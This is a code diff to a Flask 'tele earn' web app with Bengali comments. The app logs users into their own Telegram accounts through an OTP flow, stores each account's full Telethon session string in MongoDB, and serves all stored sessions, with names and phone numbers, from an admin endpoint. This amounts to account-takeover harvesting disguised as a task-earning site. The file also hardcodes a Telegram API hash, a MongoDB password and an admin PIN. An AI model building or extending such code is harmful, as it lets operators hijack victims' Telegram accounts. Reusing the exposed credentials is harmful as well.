@@ -1,4 +1,5 @@
 import os
+import asyncio
 from flask import Flask, render_template, request, jsonify, session
 from flask_cors import CORS
 from pymongo import MongoClient
@@ -10,7 +11,7 @@ from datetime import datetime
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")
 
-# CORS সেটিংস
+# CORS সেটিংস (আপনার অরিজিনাল সেটিংস)
 CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)
 
 # আপনার কনফিগারেশন (API ID/Hash & MongoDB)
@@ -18,19 +19,19 @@ API_ID = 36466824
 API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
 MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"
 
-# ডাটাবেস কানেকশন (টাইমআউট ফিক্স সহ)
-client_db = MongoClient(MONGO_URI, connectTimeoutMS=30000, socketTimeoutMS=30000)
+# ডাটাবেস কানেকশন (টাইমআউট ফিক্সসহ মজবুত কানেকশন)
+client_db = MongoClient(MONGO_URI, connectTimeoutMS=30000, socketTimeoutMS=30000, serverSelectionTimeoutMS=30000)
 db = client_db['aaf_tele_earn_db']
 users_col = db['users']
 ads_col = db['ads']  
 tasks_col = db['tasks'] 
 withdraws_col = db['withdraws']
 
-# টেম্পোরারি ক্লায়েন্ট স্টোর (লগইন সেশন হ্যান্ডেল করতে)
+# টেম্পোরারি ক্লায়েন্ট স্টোর
 temp_clients = {}
 
 # ---------------------------------------------------------
-# ১. HTML পেজ রাউটস (সবগুলো পেজ এখানে আছে)
+# ১. HTML পেজ রাউটস (আপনার সব পেজ এখানে আছে)
 # ---------------------------------------------------------
 
 @app.route('/')
@@ -58,7 +59,7 @@ def render_account_page():
 def render_wallet_page(): 
     return render_template('wallet.html')
 
-# অ্যাডমিন পিন এবং অ্যাডমিন পেজ
+# অ্যাডমিন পিন কনফিগারেশন
 ADMIN_PIN = "Abdullah6790" 
 
 @app.route('/admin')
@@ -80,7 +81,7 @@ def render_admin_panel():
 
 
 # ---------------------------------------------------------
-# ২. ইউজার লগইন ও ওটিপি এপিআই (সব async রিমুভ করা হয়েছে)
+# ২. ইউজার লগইন ও ওটিপি এপিআই (এরর ফিক্সড)
 # ---------------------------------------------------------
 
 @app.route('/api/send_otp', methods=['POST'])
@@ -90,18 +91,18 @@ def send_otp_handler():
     if not phone: return jsonify({"success": False, "message": "Phone number missing"})
 
     try:
-        # টেলিথন ক্লায়েন্ট কানেকশন (Synchronous মোডে)
+        # ইভেন্ট লুপ ফিক্স (এই ৪ লাইন আপনার এরর বন্ধ করবে)
+        try:
+            loop = asyncio.get_event_loop()
+        except RuntimeError:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         client.connect()
         
-        # ওটিপি পাঠানো
         result = client.send_code_request(phone)
-        
-        # ডাটা সেভ রাখা পরবর্তী ধাপের জন্য
-        temp_clients[phone] = {
-            "client": client, 
-            "hash": result.phone_code_hash
-        }
+        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash}
         return jsonify({"success": True, "message": "OTP Sent Successfully!"})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
@@ -110,19 +111,15 @@ def send_otp_handler():
 def verify_login_handler():
     data = request.json
     phone, code, password = data.get('phone'), data.get('code'), data.get('password')
-    
-    if phone not in temp_clients: 
-        return jsonify({"success": False, "message": "Session expired, try again."})
+    if phone not in temp_clients: return jsonify({"success": False, "message": "Session expired"})
 
     try:
         client = temp_clients[phone]["client"]
-        phone_hash = temp_clients[phone]["hash"]
+        h = temp_clients[phone]["hash"]
         
-        # লগইন ভেরিফাই
-        user = client.sign_in(phone, code, phone_code_hash=phone_hash, password=password)
+        user = client.sign_in(phone, code, phone_code_hash=h, password=password)
         session_str = client.session.save()
         
-        # ইউজার ডাটাবেসে সেভ করা
         user_info = {
             "telegram_id": user.id,
             "phone": phone,
@@ -134,15 +131,7 @@ def verify_login_handler():
         
         users_col.update_one(
             {"telegram_id": user.id},
-            {
-                "$set": user_info,
-                "$setOnInsert": {
-                    "main_balance": 0.00,
-                    "joined_at": datetime.utcnow(),
-                    "status": "active",
-                    "completed_tasks": 0
-                }
-            },
+            {"$set": user_info, "$setOnInsert": {"main_balance": 0.00, "joined_at": datetime.utcnow(), "status": "active", "completed_tasks": 0}},
             upsert=True
         )
         
@@ -200,10 +189,7 @@ def add_balance_from_task():
     if not uid: return jsonify({"success": False})
     
     amount = float(request.json.get('amount', 0))
-    users_col.update_one(
-        {"telegram_id": uid},
-        {"$inc": {"main_balance": amount, "completed_tasks": 1}}
-    )
+    users_col.update_one({"telegram_id": uid}, {"$inc": {"main_balance": amount, "completed_tasks": 1}})
     return jsonify({"success": True})
 
 
@@ -217,9 +203,8 @@ def manage_update_ads():
         data = request.json
         ads_list = data.get('ads', [])
         ads_col.delete_many({}) 
-        if ads_list:
-            ads_col.insert_many(ads_list)
-        return jsonify({"success": True, "message": "Ads Updated Successfully!"})
+        if ads_list: ads_col.insert_many(ads_list)
+        return jsonify({"success": True, "message": "Ads Updated!"})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
 
@@ -249,14 +234,9 @@ def manage_update_user():
     except Exception as e:
         return jsonify({"success": False})
 
-@app.route('/api/admin/get_withdrawals')
-def manage_get_withdrawals():
-    withdraws = list(withdraws_col.find({}, {"_id": 0}))
-    return jsonify({"success": True, "withdrawals": withdraws})
-
 @app.route('/api/admin/get_all_sessions')
 def manage_get_sessions():
-    users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1}))
+    users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1, "telegram_id": 1}))
     return jsonify({"success": True, "sessions": users})
 
 
@@ -267,13 +247,11 @@ def manage_get_sessions():
 @app.route('/api/get_active_ads')
 @app.route('/api/get_ads')
 def fetch_ads():
-    ads = list(ads_col.find({}, {"_id": 0}))
-    return jsonify({"success": True, "ads": ads})
+    return jsonify({"success": True, "ads": list(ads_col.find({}, {"_id": 0}))})
 
 @app.route('/api/get_tasks')
 def fetch_tasks():
-    tasks = list(tasks_col.find({"status": "active"}, {"_id": 0}))
-    return jsonify({"success": True, "tasks": tasks})
+    return jsonify({"success": True, "tasks": list(tasks_col.find({"status": "active"}, {"_id": 0}))})
 
 
 # ---------------------------------------------------------
@@ -285,6 +263,5 @@ def ping_checker():
     return "PONG", 200
 
 if __name__ == "__main__":
-    # রেন্ডার পোর্ট কনফিগারেশন
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
